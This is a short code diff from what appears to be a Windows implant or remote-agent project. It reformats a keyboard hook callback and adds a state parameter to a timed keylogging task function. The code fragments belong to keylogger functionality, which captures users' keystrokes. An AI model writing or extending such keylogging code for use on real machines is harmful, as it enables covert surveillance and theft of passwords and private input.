@@ -83,8 +83,11 @@ namespace Task::Helper::KeyLog
         }
     }
 
-    LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
-    {
+    LRESULT CALLBACK KeyboardProc(
+        int nCode,
+        WPARAM wParam,
+        LPARAM lParam
+    ) {
         CHAR szBuf[128];
         HDC hdc;
         static INT c = 0;
@@ -108,7 +111,7 @@ namespace Task::Helper::KeyLog
 
 namespace Task
 {
-    std::wstring KeyLog(const std::wstring& wLogTime)
+    std::wstring KeyLog(State::PSTATE pState, const std::wstring& wLogTime)
     {
         INT nLogTime = std::stoi(wLogTime);
 
@@ -121,7 +124,6 @@ namespace Task
         // Keep running 'nLogTime' seconds.
         MSG msg;
         std::chrono::time_point start = std::chrono::steady_clock::now();
-        // while (GetMessage(&msg, NULL, 0, 0))
         while (1==1)
         {
             PeekMessage(&msg, NULL, 0, 0, 0);
